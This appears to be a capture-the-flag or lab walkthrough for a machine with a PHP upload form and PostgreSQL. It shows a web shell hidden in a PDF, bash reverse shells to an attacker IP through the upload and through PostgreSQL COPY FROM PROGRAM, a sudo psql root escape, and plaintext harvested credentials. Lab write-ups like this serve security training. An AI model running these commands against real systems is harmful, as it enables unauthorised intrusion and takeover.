## Takeaway
## Metadata
- Initial recon will find URL `http://192.168.210.225:8090/backend/` gives status code `403`. 
	- However, with further directory fuzzing, One can find `http://192.168.210.225:8090/backend/default/index.php` presents a login page.![[Pasted image 20240327120617.png]]![[Pasted image 20240327121207.png]]![[Pasted image 20240327120632.png]]
		- Default Credential `admin:admin` can be used to login. After login, one are offered an opportunity to upload PDF files.
	- Directory fuzzing will identify potentially all uploads are located at `http://192.168.210.225:8090/backend/default/uploads/`. Although the directory accessing directory itself gives `403` but not individual files. If we upload an `blank.pdf`, one can access it at `http://192.168.210.225:8090/backend/default/uploads/blank.pdf`.![[Pasted image 20240327121415.png]]
	- Furthermore, it seems that the check only cares about the actual format of the file without validating the file extension.![[Pasted image 20240327121856.png]]
- Within `config.php` at `~/backend/default`, we can locate a pair of credential for accessing `postgresql` database as `postgres:EAZT5EMULA75F8MC`.![[Pasted image 20240327145232.png]]
	- Connecting for database using the credential can confirm the `postgresql` database running is of version `12.12` which is vulnerable to `Authenticated RCE` (CVE-2019â€“9193).![[Pasted image 20240327145451.png]]
		- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution
- Run `sudo -l` as `postgres` will identify the user can run `/usr/bin/psql` without password as any user.![[Pasted image 20240327145930.png]]
# Exploitation
# Shell as www-data
- Run `echo "<?php echo system($_REQUEST['cmd']); ?>" >> blank.pdf` and upload `blank.pdf` while using `burpsuite` to capture the request and rename the file to `blank.php`.
- Set up listener and navigate `http://192.168.210.225:8090/backend/default/uploads/blank.php?cmd=/bin/bash+-c+'/bin/bash+-i+>%26+/dev/tcp/192.168.45.189/80+0>%261'` to initiate the reverse shell call back.
# Shell as postgres
- Run `psql -h 127.0.0.1 -d webapp -U postgres -W` and enter password `EAZT5EMULA75F8MC` to login `PostgreSQL` database.
- Set up listener and run the following code to receive a reverse shell as `postgres`:
```shell
EATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM '/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.45.189/443 0>&1"';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```
# PrivEsc
- As `postgres`, run `sudo /usr/bin/psql -h 127.0.0.1 -U postgres -W`, `\?` , `!/bin/bash` to obtain a root session.
	- Do not use `sudo /usr/bin/psql` since by default, `psql` try to login the database as the user running the command, in the case here `root`. Hence, the following error will appear `psql: error: FATAL:  role "root" does not exist`.
# Credential
- Credential for `postgresql`:
	- `postgres`: EAZT5EMULA75F8MC
- `SKYLARK\kiosk`: XEwUS^9R2Gwt8O914![[Pasted image 20240327124118.png]]